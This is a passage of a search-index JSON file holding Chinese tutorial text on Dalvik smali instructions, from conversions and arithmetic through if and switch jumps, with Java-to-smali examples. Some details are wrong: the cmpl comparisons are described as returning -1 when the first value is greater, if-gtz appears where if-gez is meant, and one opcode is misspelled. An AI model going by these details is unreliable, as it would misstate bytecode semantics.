\u5c06\u6574\u578b\u6570\u8f6c\u6362\u4e3a\u53cc\u7cbe\u5ea6\u6d6e\u70b9\u6570 long-to-int \u5c06\u957f\u6574\u578b\u6570\u8f6c\u6362\u4e3a\u6574\u578b long-to-float \u5c06\u957f\u6574\u578b\u6570\u8f6c\u6362\u4e3a\u5355\u7cbe\u5ea6\u6d6e\u70b9\u578b long-to-double \u5c06\u957f\u6574\u578b\u6570\u8f6c\u6362\u4e3a\u53cc\u7cbe\u5ea6\u6d6e\u70b9\u578b float-to-int \u5c06\u5355\u7cbe\u5ea6\u6d6e\u70b9\u6570\u8f6c\u6362\u4e3a\u6574\u578b float-to-long \u5c06\u5355\u7cbe\u5ea6\u6d6e\u70b9\u6570\u8f6c\u6362\u4e3a\u957f\u6574\u578b\u6570 float-to-double \u5c06\u5355\u7cbe\u5ea6\u6d6e\u70b9\u6570\u8f6c\u6362\u4e3a\u53cc\u7cbe\u5ea6\u6d6e\u70b9\u578b\u6570 double-to-int \u5c06\u53cc\u7cbe\u5ea6\u6d6e\u70b9\u6570\u8f6c\u6362\u4e3a\u6574\u578b double-to-long \u5c06\u53cc\u7cbe\u5ea6\u6d6e\u70b9\u6570\u8f6c\u6362\u4e3a\u957f\u6574\u578b double-to-float \u5c06\u53cc\u7cbe\u5ea6\u6d6e\u70b9\u6570\u8f6c\u6362\u4e3a\u5355\u7cbe\u5ea6\u6d6e\u70b9\u578b int-to-byte \u5c06\u6574\u578b\u8f6c\u6362\u4e3a\u5b57\u8282\u578b int-to-char \u5c06\u6574\u578b\u8f6c\u6362\u4e3a\u5b57\u7b26\u578b int-to-short \u5c06\u6574\u578b\u8f6c\u6362\u4e3a\u77ed\u6574\u578b \u4e3e\u4e2a\u4f8b\u5b50 int-to-short v0,v1 \u5373\u5c06\u5bc4\u5b58\u5668v1\u7684\u503c\u5f3a\u5236\u8f6c\u6362\u4e3ashort\u7c7b\u578b\uff0c\u5e76\u653e\u5165v0\u4e2d\u3002","title":"\u6570\u636e\u8f6c\u6362\u6307\u4ee4"},{"location":"android/basic_operating_mechanism/java_layer/smali/smali/#_27","text":"\u6570\u5b66\u7b97\u6307\u4ee4\u5305\u62ec\u7b97\u672f\u8fd0\u7b97\u6307\u4ee4\u4e0e\u903b\u8f91\u8fd0\u7b97\u6307\u4ee4\u3002\u5176\u4e2d\uff0c\u7b97\u672f\u8fd0\u7b97\u6307\u4ee4\u5305\u62ec\u52a0\uff0c\u51cf\uff0c\u4e58\uff0c\u9664\uff0c\u6a21\uff0c\u79fb\u4f4d\u7b49\u8fd0\u7b97\uff0c\u903b\u8f91\u8fd0\u7b97\u6307\u4ee4\u4e3b\u8981\u8fdb\u884c\u6570\u503c\u95f4\u4e0e\uff0c\u6216\uff0c\u975e\uff0c\u6291\u6216\u7b49\u8fd0\u7b97\u3002 \u6570\u636e\u8fd0\u7b97\u6307\u4ee4\u6709\u4ee5\u4e0b\u56db\u7c7b\uff0c\u5176\u4e2d\u8fd0\u7b97\u7b26\u4e3abinop\u3002 \u6307\u4ee4 \u8bf4\u660e binop vAA, vBB, vCC \u5c06vBB\u5bc4\u5b58\u5668\u4e0evCC\u5bc4\u5b58\u5668\u8fdb\u884c\u8fd0\u7b97\uff0c\u7ed3\u679c\u4fdd\u5b58\u5230vAA\u5bc4\u5b58\u5668 binop/2addr vA, vB \u5c06vA\u5bc4\u5b58\u5668\u4e0evB\u5bc4\u5b58\u5668\u8fdb\u884c\u8fd0\u7b97\uff0c\u7ed3\u679c\u4fdd\u5b58\u5230vA\u5bc4\u5b58\u5668 binop/lit16 vA, vB, #+CCCC \u5c06vB\u5bc4\u5b58\u5668\u4e0e\u5e38\u91cf CCCC\u8fdb\u884c\u8fd0\u7b97\uff0c\u7ed3\u679c\u4fdd\u5b58\u5230vA\u5bc4\u5b58\u5668 binop/lit8 vAA, vBB, #+CC \u5c06vBB\u5bc4\u5b58\u5668\u4e0e\u5e38\u91cfCC\u8fdb\u884c\u8fd0\u7b97\uff0c\u7ed3\u679c\u4fdd\u5b58\u5230vAA\u5bc4\u5b58\u5668 \u540e\u97623\u7c7b\u6307\u4ee4\u6bd4\u7b2c1\u7c7b\u6307\u4ee4\u5206\u522b\u591a\u51fa\u4e862addr\uff0clit16\uff0clit8\u540e\u7f00\u3002\u4f46\u662f\uff0c\u5bf9\u4e8e\u57fa\u7840\u5b57\u8282\u7801\u76f8\u540c\u7684\u6307\u4ee4\u6765\u8bf4\uff0c\u5176\u6267\u884c\u7684\u8fd0\u7b97\u64cd\u4f5c\u662f\u7c7b\u4f3c\u7684\u3002\u6240\u4ee5\u8fd9\u91cc\u6211\u4eec\u4e3b\u8981\u4ecb\u7ecd\u7b2c\u4e00\u7c7b\u6307\u4ee4\u3002\u9664\u6b64\u4e4b\u5916\uff0c\u6839\u636e\u6570\u636e\u7684\u7c7b\u578b\u4e0d\u540c\u4f1a\u5728\u57fa\u7840\u5b57\u8282\u7801\u540e\u9762\u52a0\u4e0a\u6570\u636e\u7c7b\u578b\u540e\u7f00\uff0c\u5982 -int \u6216 -long \u5206\u522b\u8868\u793a\u64cd\u4f5c\u7684\u6570\u636e\u7c7b\u578b\u4e3a\u6574\u578b\u4e0e\u957f\u6574\u578b\u3002\u7b2c\u4e00\u7c7b\u6307\u4ee4\u7684\u8fd0\u7b97\u7c7b\u578b\u5982\u4e0b \u8fd0\u7b97\u7c7b\u578b \u8bf4\u660e add-type vBB + vCC sub-type vBB - vCC mul-type vBB * vCC div-type vBB / vCC rem-type vBB % vCC and-type vBB & vCC or-type vBB | vCC xor-type vBB ^ vCC shl-type vBB << vCC \uff0c\u6709\u7b26\u53f7\u6570\u5de6\u79fb shr-type vBB >> vCC\uff0c\u6709\u7b26\u53f7\u6570\u53f3\u79fb ushr-type vBB >>> vCC\uff0c\u65e0\u7b26\u53f7\u6570\u53f3\u79fb \u5176\u4e2d\u57fa\u7840\u5b57\u8282\u7801\u540e\u9762\u7684-type\u53ef\u4ee5\u662f-int\uff0c-long\uff0c -float\uff0c-double\u3002 \u4e3e\u4e2a\u4f8b\u5b50\uff0cjava\u6e90\u7801\u4e3a int a = 5 , b = 2 ; a += b ; a -= b ; a *= b ; a /= b ; a %= b ; a &= b ; a |= b ; a ^= b ; a <<= b ; a >>= b ; a >>>= b ; \u5176\u5bf9\u5e94\u7684smali\u4e3a const/4 v0 , 0x5 const/4 v1 , 0x2 add-int/2addr v0 , v1 sub-int/2addr v0 , v1 mul-int/2addr v0 , v1 div-int/2addr v0 , v1 rem-int/2addr v0 , v1 and-int/2addr v0 , v1 or-int/2addr v0 , v1 xor-int/2addr v0 , v1 shl-int/2addr v0 , v1 shr-int/2addr v0 , v1 ushr-int/2addr v0 , v1","title":"\u6570\u5b66\u8fd0\u7b97\u6307\u4ee4"},{"location":"android/basic_operating_mechanism/java_layer/smali/smali/#_28","text":"\u6570\u7ec4\u64cd\u4f5c\u6307\u4ee4\u4e2d\u5b9e\u73b0\u4e86\u83b7\u53d6\u6570\u7ec4\u957f\u5ea6\uff0c\u65b0\u5efa\u6570\u7ec4\uff0c\u6570\u7ec4\u8d4b\u503c\uff0c\u6570\u7ec4\u5143\u7d20\u53d6\u503c\u4e0e\u8d4b\u503c\u7b49\u64cd\u4f5c\u3002 \u6307\u4ee4 \u8bf4\u660e array-length vA, vB \u83b7\u53d6\u7ed9\u5b9avB\u5bc4\u5b58\u5668\u4e2d\u6570\u7ec4\u7684\u957f\u5ea6\u5e76\u8d4b\u7ed9vA\u5bc4\u5b58\u5668\uff0c\u6570\u7ec4\u957f\u5ea6\u6307\u7684\u662f\u6570\u7ec4\u4e2d\u7684\u5143\u7d20\u4e2a\u6570\u3002 new-array vA, vB, type@CCCC \u6784\u9020\u5927\u5c0f\u4e3avB\u7684\u5143\u7d20\u7c7b\u578b\u4e3atype@CCCC\u7684\u6570\u7ec4\uff0c\u5e76\u5c06\u5f15\u7528\u8d4b\u7ed9vA\u5bc4\u5b58\u5668 filled-new-array {vC, vD, vE, vF, vG},type@BBBB \u6784\u9020\u5927\u5c0fvA\u7684\u5143\u7d20\u7c7b\u578b\u4e3atype@BBBB\u7684\u6570\u7ec4\u5e76\u586b\u5145\u6570\u7ec4\u5185\u5bb9\u3002vA\u5bc4\u5b58\u5668\u662f\u9690\u542b\u4f7f\u7528\u7684\uff0c\u9664\u4e86\u6307\u5b9a\u6570\u7ec4\u7684\u5927\u5c0f\u5916\u8fd8\u6307\u5b9a\u4e86\u53c2\u6570\u7684\u4e2a\u6570\uff0cvC~vG\u662f\u4f7f\u7528\u5230\u7684\u53c2\u6570\u5bc4\u5b58\u5e8f\u5217 filled-new-array/range {vCCCC ..vNNNN}, type@BBBB \u6307\u4ee4\u529f\u80fd\u4e0efilled-new-array {vC, vD, vE, vF, vG},type@BBBB\u76f8\u540c\uff0c\u53ea\u662f\u53c2\u6570\u5bc4\u5b58\u5668\u4f7f\u7528range\u540e\u7f00\u6307\u5b9a\u4e86\u53d6\u503c\u8303\u56f4 \uff0cvC\u662f\u7b2c\u4e00\u4e2a\u53c2\u6570\u5bc4\u5b58\u5668\uff0cN = A +C -1 fill-array-data vAA, +BBBBBBBB \u7528\u6307\u5b9a\u7684\u6570\u636e\u6765\u586b\u5145\u6570\u7ec4\uff0cvAA\u5bc4\u5b58\u5668\u4e3a\u6570\u7ec4\u5f15\u7528\uff0c\u5f15\u7528\u5fc5\u987b\u4e3a\u57fa\u7840\u7c7b\u578b\u7684\u6570\u7ec4\uff0c\u5728\u6307\u4ee4\u540e\u9762\u4f1a\u7d27\u8ddf\u4e00\u4e2a\u6570\u636e\u8868 new-array/jumbo vAAAA, vBBBB,type@CCCCCCCC \u6307\u4ee4\u529f\u80fd\u4e0enew-array vA,vB,type@CCCC\u76f8\u540c\uff0c\u4f46\u662f\u5bc4\u5b58\u5668\u503c\u4e0e\u6307\u4ee4\u7684\u7d22\u5f15\u53d6\u503c\u8303\u56f4\u66f4\u5927\uff08Android4.0\u4e2d\u65b0\u589e\u7684\u6307\u4ee4\uff09 filled-new-array/jumbo {vCCCC ..vNNNN},type@BBBBBBBB \u6307\u4ee4\u529f\u80fd\u4e0efilled-new-array/range {vCCCC ..vNNNN},type@BBBB\u76f8\u540c\uff0c\u53ea\u662f\u7d22\u5f15\u53d6\u503c\u8303\u56f4\u66f4\u5927\uff08Android4.0\u4e2d\u65b0\u589e\u7684\u6307\u4ee4\uff09 arrayop vAA, vBB, vCC \u5bf9vBB\u5bc4\u5b58\u5668\u6307\u5b9a\u7684\u6570\u7ec4\u5143\u7d20\u8fdb\u884c\u53d6\u503c\u4e0e\u8d4b\u503c\u3002vCC\u5bc4\u5b58\u5668\u6307\u5b9a\u6570\u7ec4\u5143\u7d20\u7d22\u5f15\uff0cvAA\u5bc4\u5b58\u5668\u7528\u6765\u5b58\u653e\u8bfb\u53d6\u7684\u6216\u9700\u8981\u8bbe\u7f6e\u7684\u6570\u7ec4\u5143\u7d20\u7684\u503c\u3002\u8bfb\u53d6\u5143\u7d20\u4f7f\u7528aget\u7c7b\u6307\u4ee4\uff0c\u5143\u7d20\u8d4b\u503c\u4f7f\u7528aput\u7c7b\u6307\u5b9a\uff0c\u6839\u636e\u6570\u7ec4\u4e2d\u5b58\u50a8\u7684\u7c7b\u578b\u6307\u4ee4\u540e\u9762\u4f1a\u7d27\u8ddf\u4e0d\u540c\u7684\u6307\u4ee4\u540e\u7f00\uff0c\u6307\u4ee4\u5217\u8868\u5982\u4e0b\uff1aaget, aget-wide, aget-object, aget-boolean, aget-byte,aget-char, aget-short, aput, aput-wide, aput-object, aput-boolean, aput-byte, aput-char, aput-short\u3002 \u6211\u4eec\u53ef\u4ee5\u5b9a\u4e49\u6570\u7ec4\u5982\u4e0b int [] arr = new int [ 10 ]; \u5176\u5bf9\u5e94\u7684smali\u5982\u4e0b const/4 v1 , 0xa new-array v0 , v1 , I \u5982\u679c\u6211\u4eec\u76f4\u63a5\u5728\u5b9a\u4e49\u65f6\uff0c\u5bf9\u6570\u7ec4\u8fdb\u884c\u521d\u59cb\u5316\uff0c\u5982\u4e0b int [ ] arr = { 1 , 2 , 3 , 4 , 5 } ; \u5bf9\u5e94\u7684smali\u5982\u4e0b const/4 v1 , 0x1 const/4 v2 , 0x2 const/4 v3 , 0x3 const/4 v4 , 0x4 const/4 v5 , 0x5 filled-new-array { v1 , v2 , v3 , v4 , v5 }, I move-result v0 \u5728\u5bc4\u5b58\u5668\u8fde\u7eed\u7684\u60c5\u51b5\u4e0b\uff0c\u8fd8\u53ef\u4ee5\u5199\u6210\u5982\u4e0b\u4ee3\u7801 const/4 v1 , 0x1 const/4 v2 , 0x2 const/4 v3 , 0x3 const/4 v4 , 0x4 const/4 v5 , 0x5 filled-new-array-range { v1 .. v5 }, I move-result v0","title":"\u6570\u7ec4\u64cd\u4f5c\u6307\u4ee4"},{"location":"android/basic_operating_mechanism/java_layer/smali/smali/#_29","text":"\u5b9e\u4f8b\u64cd\u4f5c\u6307\u4ee4\u4e3b\u8981\u5b9e\u73b0\u4e86\u5b9e\u4f8b\u7684\u7c7b\u578b\u8f6c\u6362\uff0c\u68c0\u67e5\u53ca\u65b0\u5efa\u7b49\u529f\u80fd\u3002 \u6307\u4ee4 \u8bf4\u660e check-cast vAA, type@BBBB \u5c06vAA\u5bc4\u5b58\u5668\u4e2d\u7684\u5bf9\u8c61\u5f15\u7528\u8f6c\u6362\u6210type@BBBB\u7c7b\u578b\uff0c\u5982\u679c\u5931\u8d25\u7684\u8bdd\uff0c\u629b\u51faClassCastException\u5f02\u5e38\u3002\u5982\u679c\u7c7b\u578bB\u6307\u5b9a\u7684\u662f\u57fa\u672c\u7c7b\u578b\uff0c\u5bf9\u4e8e\u975e\u57fa\u672c\u7c7b\u578b\u7684A\u6765\u8bf4\uff0c\u8fd0\u884c\u65f6\u59cb\u7ec8\u4f1a\u5931\u8d25 instance-of vA, vB, type@CCCC \u5224\u65advB\u5bc4\u5b58\u5668\u4e2d\u7684\u5bf9\u8c61\u5f15\u7528\u662f\u5426\u53ef\u4ee5\u8f6c\u6362\u6210\u6307\u5b9a\u7684\u7c7b\u578b\uff0c\u5982\u679c\u53ef\u4ee5\uff0cvA\u5bc4\u5b58\u5668\u88ab\u8d4b\u503c\u4e3a1\uff0c\u5426\u5219vA\u5bc4\u5b58\u5668\u88ab \u8d4b\u503c\u4e3a0\u3002 new-instance vAA, type@BBBB \u6784\u9020\u4e00\u4e2a\u6307\u5b9a\u7c7b\u578b\u5bf9\u8c61\u7684\u65b0\u5b9e\u4f8b\uff0c\u5e76\u5c06\u5bf9\u8c61\u5f15\u7528\u8d4b\u503c\u7ed9vAA\u5bc4\u5b58\u5668\uff0c\u7c7b\u578b\u7b26type\u6307\u5b9a\u7684\u7c7b\u578b\u4e0d\u80fd\u662f\u6570\u7ec4\u7c7b check-cast/jumbo vAAAA, type@BBBBBBBB \u529f\u80fd\u4e0echeck-cast vAA, type@BBBB\u76f8\u540c\uff0c\u53ea\u662f\u5bc4\u5b58\u5668\u503c\u4e0e\u6307\u4ee4\u7684\u7d22\u5f15\u53d6\u503c\u8303\u56f4\u66f4\u5927\uff08Android4.0\u4e2d\u65b0\u589e\u7684\u6307\u4ee4\uff09 instance-of/jumbo vAAAA, vBBBB, type@CCCCCCCC \u529f\u80fd\u4e0einstance-of vA, vB, type@CCCC\u76f8\u540c\uff0c\u53ea\u662f\u5bc4\u5b58\u5668\u503c\u4e0e\u6307\u4ee4\u7684\u7d22\u5f15\u53d6\u503c\u8303\u56f4\u66f4\u5927\uff08Android4.0\u4e2d\u65b0\u589e\u7684\u6307\u4ee4\uff09 new-instance/jumbo vAAAA, type@BBBBBBBB \u529f\u80fd\u4e0enew-instance vAA, type@BBBB\u76f8\u540c\uff0c\u53ea\u662f\u5bc4\u5b58\u5668\u503c\u4e0e\u6307\u4ee4\u7684\u7d22\u5f15\u53d6\u503c\u8303\u56f4\u66f4\u5927\uff08Android4.0\u4e2d\u65b0\u589e\u7684\u6307\u4ee4\uff09 \u6bd4\u5982\uff0c\u6211\u4eec\u5b9a\u4e49\u4e00\u4e2a\u5b9e\u4f8b Object obj = new Object (); \u5176\u5bf9\u5e94\u7684smali\u4ee3\u7801\u5982\u4e0b new-instance v0 , L java/lang/ Object ; invoke-direct-empty { v0 }, L java/lang/ Object ; -> <init> () V \u518d\u6bd4\u5982\u6211\u4eec\u53ef\u4ee5\u8fdb\u884c\u5982\u4e0b\u7684\u7c7b\u578b\u5224\u65ad String s = \"test\" ; boolean b = s instanceof String ; \u5176\u5bf9\u5e94\u7684smali\u4ee3\u7801\u5982\u4e0b const-string v0 , \"test\" instance-of v1 , v0 , L java/lang/ String ; \u5982\u679c\u6211\u4eec\u8fdb\u884c\u7c7b\u578b\u7684\u5f3a\u5236\u8f6c\u6362 String s = \"test\" ; Object o = ( Object ) s ; \u5176\u5bf9\u5e94\u7684smali\u4ee3\u7801\u5982\u4e0b const-string v0 , \"test\" check-cast v0 , L java/lang/ Object ; move-object v1 , v0","title":"\u5b9e\u4f8b\u64cd\u4f5c\u6307\u4ee4"},{"location":"android/basic_operating_mechanism/java_layer/smali/smali/#_30","text":"\u5b57\u6bb5\u64cd\u4f5c\u6307\u4ee4\u4e3b\u8981\u662f\u5bf9\u5b9e\u4f8b\u7684\u5b57\u6bb5\u8fdb\u884c\u8bfb\u5199\u64cd\u4f5c\u3002\u5176\u4e2d\u8bfb\u64cd\u4f5c\u4f7f\u7528get\u6765\u6807\u8bb0\uff0c\u5373vx=vy.field\u3002\u5199\u64cd\u4f5c\u4f7f\u7528put\u6765\u6807\u8bb0\uff0c\u5373vy.field=vx\u3002 \u5176\u4e2d\u5bf9\u4e8ejava\u4e2d\u7684\u7c7b\u6765\u8bf4\uff0c\u4e3b\u8981\u5206\u4e3a\u4e24\u79cd\u5b57\u6bb5\uff0c\u666e\u901a\u5b57\u6bb5\uff0c\u9759\u6001\u5b57\u6bb5\u3002\u5bf9\u4e8e\u666e\u901a\u5b57\u6bb5\u91c7\u7528\u64cd\u4f5c\u6307\u4ee4\u524d\u52a0i\u6765\u6807\u8bb0\uff0c\u5982iget\uff0ciput\u3002\u5bf9\u4e8e\u9759\u6001\u5b57\u6bb5\u91c7\u7528\u5728\u64cd\u4f5c\u6307\u4ee4\u524d\u52a0s\u6765\u6807\u8bb0\uff0c\u5982sput\uff0csget\u3002 \u6b64\u5916\uff0c\u5bf9\u4e8e\u4e0d\u540c\u5b57\u6bb5\u5927\u5c0f\u7684\u64cd\u4f5c\u4f1a\u5728\u6307\u4ee4\u7684\u540e\u9762\u52a0\u4e0a\u540e\u7f00\u6765\u8fdb\u884c\u533a\u522b\u3002\u5982 iget-byte\u6307\u4ee4\u8868\u793a\u8bfb\u53d6\u7c7b\u578b\u4e3a\u5b57\u8282\u7684\u5b9e\u4f8b\u5b57\u6bb5\u7684\u503c\uff0ciput-short\u6307\u4ee4\u8868\u793a\u8bbe\u7f6e\u7684\u5b9e\u4f8b\u5b57\u6bb5\u7684\u7c7b\u578b\u4e3a\u77ed\u6574\u578b\u3002 \u666e\u901a\u5b57\u6bb5\u64cd\u4f5c\u6307\u4ee4\u6709\uff1a iget\uff0ciget-wide\uff0ciget-object\uff0ciget-boolean\uff0ciget-byte\uff0ciget-char\uff0ciget-short\uff0c iput\uff0ciput-wide\uff0ciput-object\uff0ciput-boolean\uff0ciput-byte\uff0ciput-char\uff0ciput-short\u3002 \u9759\u6001\u5b57\u6bb5\u64cd\u4f5c\u6307\u4ee4\u6709\uff1a sget\uff0csget-wide\uff0csget-object\uff0csget-boolean\uff0csget-byte\uff0csget-char\uff0csget-short\uff0c sput\uff0csput-wide\uff0csput-object\uff0csput-boolean\uff0csput-byte\uff0csput-char\uff0csput-short\u3002 \u5982\u679c\u6211\u4eec\u7f16\u5199\u5982\u4e0b\u4ee3\u7801 int [] arr = new int [ 2 ]; int b = arr [ 0 ]; arr [ 1 ] = b ; \u5176\u5bf9\u5e94\u7684smali\u5982\u4e0b const/4 v0 , 0x2 new-array v1 , v0 , I const/4 v0 , 0x0 aget-int v2 , v1 , v0 const/4 v0 , 0x1 aput-int v2 , v1 , v0 \u5982\u679c\u6211\u4eec\u60f3\u83b7\u5f97\u7c7bcom.example.test\u7684\u9759\u6001int\u7c7b\u578b\u7684\u5b57\u6bb5staticField\uff0c\u5176smali\u5982\u4e0b sget v0 , L com/example/ Test ; -> staticField : I","title":"\u5b57\u6bb5\u64cd\u4f5c\u6307\u4ee4"},{"location":"android/basic_operating_mechanism/java_layer/smali/smali/#_31","text":"\u6bd4\u8f83\u6307\u4ee4\u5b9e\u73b0\u4e86\u5bf9\u4e24\u4e2a\u5bc4\u5b58\u5668\u7684\u503c\uff08\u6d6e\u70b9\u578b\u6216\u957f\u6574\u578b\uff09\u8fdb\u884c\u6bd4\u8f83\u7684\u64cd\u4f5c\u3002 \u5176\u683c\u5f0f\u4e3acmp(l/g)-kind vAA, vBB, vCC\uff0c\u5176\u4e2dvBB\u5bc4\u5b58\u5668\u4e0evCC\u5bc4\u5b58\u5668\u662f\u9700\u8981\u6bd4\u8f83\u7684\u4e24\u4e2a\u5bc4\u5b58\u5668\u6216\u5bc4\u5b58\u5668\u5bf9\uff0c\u6bd4\u8f83\u7684\u7ed3\u679c\u653e\u5230vAA\u5bc4\u5b58\u5668\u3002 l\u2192less g\u2192 great \u76ee\u524d\u7684\u6bd4\u8f83\u6307\u4ee4\u5982\u4e0b \u6307\u4ee4 \u8bf4\u660e cmpl-float \u6bd4\u8f83\u4e24\u4e2a\u5355\u7cbe\u5ea6\u6d6e\u70b9\u6570\u3002\u5982\u679cvBB\u5bc4\u5b58\u5668\u5927\u4e8evCC\u5bc4\u5b58\u5668\uff0c\u7ed3\u679c\u4e3a-1\uff0c\u76f8\u7b49\u5219\u7ed3\u679c\u4e3a0\uff0c\u5c0f\u4e8e\u7684\u8bdd\u7ed3\u679c\u4e3a1 cmpg-float \u6bd4\u8f83\u4e24\u4e2a\u5355\u7cbe\u5ea6\u6d6e\u70b9\u6570\u3002\u5982\u679cvBB\u5bc4\u5b58\u5668\u5927\u4e8evCC\u5bc4\u5b58\u5668\uff0c\u5219\u7ed3\u679c\u4e3a1\uff0c\u76f8\u7b49\u5219\u7ed3\u679c\u4e3a0\uff0c\u5c0f\u4e8e\u7684\u8bdd\u7ed3\u679c\u4e3a-1 cmpl-double \u6bd4\u8f83\u4e24\u4e2a\u53cc\u7cbe\u5ea6\u6d6e\u70b9\u6570\u3002\u5982\u679cvBB\u5bc4\u5b58\u5668\u5bf9\u5927\u4e8evCC\u5bc4\u5b58\u5668\u5bf9\uff0c\u5219\u7ed3\u679c\u4e3a-1\uff0c\u76f8\u7b49\u5219\u7ed3\u679c\u4e3a0\uff0c\u5c0f\u4e8e\u5219\u7ed3\u679c\u4e3a1 cmpg-double \u6bd4\u8f83\u4e24\u4e2a\u53cc\u7cbe\u5ea6\u6d6e\u70b9\u6570\u3002\u5982\u679cvBB\u5bc4\u5b58\u5668\u5bf9\u5927\u4e8evCC\u5bc4\u5b58\u5668\u5bf9\uff0c\u5219\u7ed3\u679c\u4e3a1\uff0c\u76f8\u7b49\u5219\u7ed3\u679c\u4e3a0\uff0c\u5c0f\u4e8e\u7684\u8bdd\uff0c\u5219\u7ed3\u679c\u4e3a-1 cmp-long \u6bd4\u8f83\u4e24\u4e2a\u957f\u6574\u578b\u6570\u3002\u5982\u679cvBB\u5bc4\u5b58\u5668\u5927\u4e8evCC\u5bc4\u5b58\u5668\uff0c\u5219\u7ed3\u679c\u4e3a1\uff0c\u76f8\u7b49\u5219\u7ed3\u679c\u4e3a0\uff0c\u5c0f\u5219\u7ed3\u679c\u4e3a-1","title":"\u6bd4\u8f83\u6307\u4ee4"},{"location":"android/basic_operating_mechanism/java_layer/smali/smali/#_32","text":"\u8df3\u8f6c\u6307\u4ee4\u5b9e\u73b0\u4e86\u4ece\u5f53\u524d\u5730\u5740\u8df3\u8f6c\u5230\u6307\u5b9a\u7684\u504f\u79fb\u5904\u7684\u64cd\u4f5c\u3002Dalvik\u6307\u4ee4\u96c6\u4e2d\u6709\u4e09\u79cd\u8df3\u8f6c\u6307\u4ee4 goto\uff0c\u65e0\u6761\u4ef6\u8df3\u8f6c switch\uff0c\u5206\u652f\u8df3\u8f6c if\uff0c\u6761\u4ef6\u8df3\u8f6c","title":"\u8df3\u8f6c\u6307\u4ee4"},{"location":"android/basic_operating_mechanism/java_layer/smali/smali/#goto","text":"\u5982\u4e0b \u6307\u4ee4 \u542b\u4e49 goto +AA \u65e0\u6761\u4ef6\u8df3\u8f6c\u5230\u6307\u5b9a\u504f\u79fb\u5904\uff0c\u504f\u79fb\u91cfAA\u4e0d\u80fd\u4e3a0 goto/16 +AAAA \u65e0\u6761\u4ef6\u8df3\u8f6c\u5230\u6307\u5b9a\u504f\u79fb\u5904\uff0c\u504f\u79fb\u91cfAAAA\u4e0d\u80fd\u4e3a0 goto/32 +AAAAAAAA \u65e0\u6761\u4ef6\u8df3\u8f6c\u5230\u6307\u5b9a\u504f\u79fb\u5904","title":"goto\u6307\u4ee4"},{"location":"android/basic_operating_mechanism/java_layer/smali/smali/#if","text":"if\u6307\u4ee4\u4e2d\u4e3b\u8981\u5206\u4e3a\u4e24\u79cdif-test\u4e0eif-testz\u3002 if-test vA,vB,+CCCC \u4f1a\u6bd4\u8f83vA\u4e0ev\uff0c\u5982\u679c\u6bd4\u8f83\u7ed3\u679c\u6ee1\u8db3\u5c31\u8df3\u8f6c\u5230CCCC\u6307\u5b9a\u7684\u504f\u79fb\u5904\uff08\u76f8\u5bf9\u5f53\u524d\u504f\u79fb\uff09\uff0c\u504f\u79fb\u91cfCCCC\u4e0d\u80fd\u4e3a0\u3002if-test\u7c7b\u578b\u7684\u6307\u4ee4\u5982\u4e0b\uff1a \u6307\u4ee4 \u8bf4\u660e if-eq vA,vB,target \u5982\u679cvA=vB\uff0c\u8df3\u8f6c\u3002 if-ne vA,vB,target \u5982\u679cvA!=vB\uff0c\u8df3\u8f6c\u3002 if-lt vA,vB,target \u5982\u679cvA<vB\uff0c\u8df3\u8f6c\u3002 if-gt vA,vB,target \u5982\u679cvA>vB\uff0c\u8df3\u8f6c\u3002 if-ge vA,vB,target \u5982\u679cvA>=vB\uff0c\u8df3\u8f6c\u3002 if-le vA,vB,target \u5982\u679cvA<=vB\uff0c\u8df3\u8f6c\u3002 if-testz\u7c7b\u578b\u7684\u6307\u4ee4\u5982\u4e0b \u6307\u4ee4 \u8bf4\u660e if-eqz vAA,target \u5982\u679cvA=0\uff0c\u8df3\u8f6c\u3002 if-nez vAA,target \u5982\u679cvA!=0\uff0c\u8df3\u8f6c\u3002 if-ltz vAA,target \u5982\u679cvA<0\uff0c\u8df3\u8f6c\u3002 if-gtz vAA,target \u5982\u679cvA>0\uff0c\u8df3\u8f6c\u3002 if-lez vAA,target \u5982\u679cvA<=0\uff0c\u8df3\u8f6c\u3002 if-gtz vAA,target \u5982\u679cvA>=0\uff0c\u8df3\u8f6c\u3002 \u4e3e\u4e2a\u4f8b\u5b50\uff0cjava\u4ee3\u7801\u5982\u4e0b int a = 10 if ( a > 0 ) a = 1 ; else a = 0 ; smali\u4ee3\u7801\u5982\u4e0b const/4 v0 , 0xa if-lez v0 , :cond_0 # if \u5757\u5f00\u59cb const/4 v0 , 0x1 goto :cond_1 # if \u5757\u7ed3\u675f :cond_0 # else \u5757\u5f00\u59cb const/4 v0 , 0x0 :cond_1 # else \u5757\u7ed3\u675f \u5728\u53ea\u6709if\u7684\u60c5\u51b5\u4e0b int a = 10 ; if ( a > 0 ) a = 1 ; smali\u4ee3\u7801\u5982\u4e0b const/4 v0 , 0xa if-lez v0 , :cond_0 # if \u5757\u5f00\u59cb const/4 v0 , 0x1 :cond_0 # if \u5757\u7ed3\u675f","title":"if\u6307\u4ee4"},{"location":"android/basic_operating_mechanism/java_layer/smali/smali/#switch","text":"\u5982\u4e0b \u6307\u4ee4 \u542b\u4e49 packed-switch vAA,+BBBBBBBB vAA\u5bc4\u5b58\u5668\u4e3aswitch\u5206\u652f\u4e2d\u9700\u8981\u5224\u65ad\u7684\u503c\uff0cBBBBBBBB\u6307\u5411\u4e00\u4e2apacked-switch-payload\u683c\u5f0f\u7684\u504f\u79fb\u8868\uff0c\u8868\u4e2d\u7684\u503c\u662f\u6709\u89c4\u5f8b\u9012\u589e\u7684\u3002 sparse-switch vAA,+BBBBBBBB vAA\u5bc4\u5b58\u5668\u4e3aswitch\u5206\u652f\u4e2d\u9700\u8981\u5224\u65ad\u7684\u503c\uff0cBBBBBBBB\u6307\u5411\u4e00\u4e2asparse-switch-payload\u683c\u5f0f\u7684\u504f\u79fb\u8868\uff0c\u8868\u4e2d\u7684\u503c\u662f\u65e0\u89c4\u5f8b\u7684\u504f\u79fb\u8868\uff0c\u8868\u4e2d\u7684\u503c\u662f\u65e0\u89c4\u5f8b\u7684\u504f\u79fb\u91cf\u3002 \u5bf9\u4e8e\u7b2c\u4e00\u79cd\u9012\u589e\u5f0f\u7684switch\uff0c\u5982\u4e0b int a = 10 ; switch ( a ){ case 0 : a = 1 ; break ; case 1 : a = 5 ; break ; case 2 : a = 10 ; break ; case 3 : a = 20 ; break ; } \u5bf9\u5e94\u7684smali\u5982\u4e0b const/16 v0 , 0xa packed-switch v0 , :pswitch_data_0 # switch \u5f00\u59cb :pswitch_0 # case 0 const/4 v0 , 0x1 goto :goto_0 :pswitch_1 # case 1 const/4 v0 , 0x5 goto :goto_0 :pswitch_2 # case 2 const/16 v0 , 0xa goto :goto_0 :pswitch_3 # case 3 const/16 v0 , 0x14 goto :goto_0 :goto_0 # switch \u7ed3\u675f return-void :pswitch_data_0 # 